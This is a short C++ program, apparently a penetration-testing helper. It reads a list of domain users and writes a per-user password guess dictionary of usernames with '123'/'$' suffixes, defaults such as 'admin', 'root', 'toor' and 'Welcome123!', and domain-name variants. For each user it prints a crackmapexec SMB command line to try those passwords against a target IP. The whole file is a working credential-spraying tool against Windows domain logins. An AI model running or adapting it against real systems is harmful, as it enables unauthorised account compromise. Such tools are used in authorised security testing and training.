#include <iostream>
#include <fstream>
#include <cstring>
#include <string>

using namespace std;

int main(){
	int SIZE = 100, c = 0;
	
	fstream file;
	
	string domainName, computerName, ip;
	
	
	string domainInfo[2], domainUsers[SIZE];
	
	char users[SIZE];
	
	file.open("users.txt", ios::in);
	
	cout << "IP: ";
	cin >> ip;
	
	if (file.fail()){
		cout << "Could not open users file"  << endl;
	}
	
	while(!file.eof()){
		//cout << users << " C: " << c <<endl;
		file.getline(users, SIZE);
		
		if (c == 0){
			//cout << "Test!!!!!!" << endl;
			
			char* token = strtok(users, ",");
			int i = 0;
			while (token != NULL) {
				
				//printf("%s\n", token);
				cout << "Token: " << token << endl;
				domainInfo[i] = token;
				token = strtok(NULL, ",");
				i++;
			}
		}
		std::string str(users);
		
		domainUsers[c] = users;
		
		c++;
	
	}
	
	int size = sizeof(domainUsers) / sizeof(domainUsers[0]);
	
	for (int i = 1; i < c; i++){
		//cout << "Test i: " << i << " SIZE: " << size << endl;
		string payloadList[15] = {domainUsers[i], domainUsers[i] + "123", domainUsers[i] + "123$", domainUsers[i] + "$", "admin", "root", "toor", "administrator", "password", "pass123", domainInfo[0], domainInfo[1], domainInfo[0] + "123", domainInfo[1] + "123", "Welcome123!"};
		fstream dictionary;
		
		dictionary.open(domainUsers[i] + ".txt", ios::out);
		
		cout << "crackmapexec smb " << ip << " -u " << domainUsers[i] << " -p " << domainUsers[i] + ".txt" << endl;
		
		if (dictionary.fail()){
			cout << "Could not create dictionary!!" << endl;
		}
		int payloadSize = sizeof(payloadList) / sizeof(payloadList[0]);
		
		for (int j = 0; j < payloadSize; j++){
			dictionary << payloadList[j] << "\n";
		}
		
		dictionary.close();
		
	}
	
	
	file.close();
	
	return 0;
	
}